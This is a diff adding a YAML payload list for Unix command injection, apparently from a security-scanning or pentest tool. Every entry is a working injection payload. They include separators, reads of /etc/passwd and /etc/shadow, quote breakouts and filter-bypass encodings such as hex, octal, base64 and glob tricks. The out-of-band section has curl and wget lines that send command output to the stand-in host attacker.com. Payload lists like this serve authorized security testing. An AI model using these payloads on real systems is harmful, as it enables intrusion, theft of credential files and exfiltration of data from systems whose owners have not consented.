@@ -1,0 +1,216 @@
+name: "Command Injection Unix Payloads"
+description: "Command injection payloads for Unix/Linux systems"
+attack_type: "cmdi"
+category: "unix"
+
+payloads:
+  # Basic command separators
+  - value: ";id"
+    description: "Semicolon separator"
+    tags: ["basic", "semicolon"]
+
+  - value: "|id"
+    description: "Pipe separator"
+    tags: ["basic", "pipe"]
+
+  - value: "||id"
+    description: "OR separator"
+    tags: ["basic", "or"]
+
+  - value: "&&id"
+    description: "AND separator"
+    tags: ["basic", "and"]
+
+  - value: "&id"
+    description: "Background separator"
+    tags: ["basic", "background"]
+
+  - value: "`id`"
+    description: "Backtick execution"
+    tags: ["basic", "backtick"]
+
+  - value: "$(id)"
+    description: "Dollar subshell"
+    tags: ["basic", "subshell"]
+
+  - value: "\nid"
+    description: "Newline separator"
+    tags: ["basic", "newline"]
+
+  # Common commands
+  - value: ";whoami"
+    description: "Current user"
+    tags: ["info", "user"]
+
+  - value: ";pwd"
+    description: "Current directory"
+    tags: ["info", "directory"]
+
+  - value: ";uname -a"
+    description: "System info"
+    tags: ["info", "system"]
+
+  - value: ";cat /etc/passwd"
+    description: "Read passwd file"
+    tags: ["file-read", "passwd"]
+
+  - value: ";cat /etc/shadow"
+    description: "Read shadow file"
+    tags: ["file-read", "shadow"]
+
+  - value: ";ls -la"
+    description: "List files"
+    tags: ["info", "listing"]
+
+  - value: ";env"
+    description: "Environment variables"
+    tags: ["info", "env"]
+
+  - value: ";ps aux"
+    description: "Process list"
+    tags: ["info", "process"]
+
+  - value: ";netstat -an"
+    description: "Network connections"
+    tags: ["info", "network"]
+
+  - value: ";ifconfig"
+    description: "Network interfaces"
+    tags: ["info", "network"]
+
+  - value: ";ip addr"
+    description: "IP addresses"
+    tags: ["info", "network"]
+
+  # File operations
+  - value: ";head /etc/passwd"
+    description: "Read file head"
+    tags: ["file-read"]
+
+  - value: ";tail /etc/passwd"
+    description: "Read file tail"
+    tags: ["file-read"]
+
+  - value: ";less /etc/passwd"
+    description: "Read with less"
+    tags: ["file-read"]
+
+  - value: ";more /etc/passwd"
+    description: "Read with more"
+    tags: ["file-read"]
+
+  - value: ";tac /etc/passwd"
+    description: "Read reversed"
+    tags: ["file-read"]
+
+  - value: ";nl /etc/passwd"
+    description: "Read with line numbers"
+    tags: ["file-read"]
+
+  # Quote context breakouts
+  - value: "';id;'"
+    description: "Single quote break"
+    tags: ["quote", "single"]
+
+  - value: "\";id;\""
+    description: "Double quote break"
+    tags: ["quote", "double"]
+
+  - value: "';id;#"
+    description: "Quote break with comment"
+    tags: ["quote", "comment"]
+
+  - value: "\";id;#"
+    description: "Double quote with comment"
+    tags: ["quote", "comment"]
+
+  # Whitespace bypass
+  - value: ";{id}"
+    description: "Brace grouping"
+    tags: ["bypass", "brace"]
+
+  - value: ";id${IFS}"
+    description: "IFS separator"
+    tags: ["bypass", "ifs"]
+
+  - value: ";$PATH$'\t'id"
+    description: "Tab via ANSI-C"
+    tags: ["bypass", "tab"]
+
+  - value: ";id<>file"
+    description: "Redirect bypass"
+    tags: ["bypass", "redirect"]
+
+  # Encoding bypasses
+  - value: ";$'\\x69\\x64'"
+    description: "Hex encoded (id)"
+    tags: ["bypass", "hex"]
+
+  - value: ";$'\\151\\144'"
+    description: "Octal encoded (id)"
+    tags: ["bypass", "octal"]
+
+  - value: ";$(echo aWQ= | base64 -d)"
+    description: "Base64 encoded"
+    tags: ["bypass", "base64"]
+
+  # Variable expansion
+  - value: ";${HOME}"
+    description: "Home directory"
+    tags: ["variable"]
+
+  - value: ";${USER}"
+    description: "Current user"
+    tags: ["variable"]
+
+  - value: ";${SHELL}"
+    description: "Shell type"
+    tags: ["variable"]
+
+  # Wildcard and globbing
+  - value: ";/???/???"
+    description: "Glob bin/cat"
+    tags: ["bypass", "glob"]
+
+  - value: ";/???/???/??"
+    description: "Glob bin/cat/id"
+    tags: ["bypass", "glob"]
+
+  # Time-based detection
+  - value: ";sleep 5"
+    description: "Sleep 5 seconds"
+    tags: ["time", "detection"]
+
+  - value: "|sleep 5"
+    description: "Pipe sleep"
+    tags: ["time", "detection"]
+
+  - value: "$(sleep 5)"
+    description: "Subshell sleep"
+    tags: ["time", "detection"]
+
+  # OOB detection
+  - value: ";curl http://attacker.com/?c=$(whoami)"
+    description: "Curl OOB"
+    tags: ["oob", "curl"]
+
+  - value: ";wget http://attacker.com/?c=$(id)"
+    description: "Wget OOB"
+    tags: ["oob", "wget"]
+
+  - value: ";ping -c 1 attacker.com"
+    description: "Ping OOB"
+    tags: ["oob", "ping"]
+
+  - value: ";nslookup attacker.com"
+    description: "DNS lookup"
+    tags: ["oob", "dns"]
+
+  # Shell specifics (bash)
+  - value: "$(<$'/etc/passwd')"
+    description: "Bash file read"
+    tags: ["bash", "file-read"]
+
+  - value: "<<<$(id)"
+    description: "Here string"
+    tags: ["bash", "herestring"]
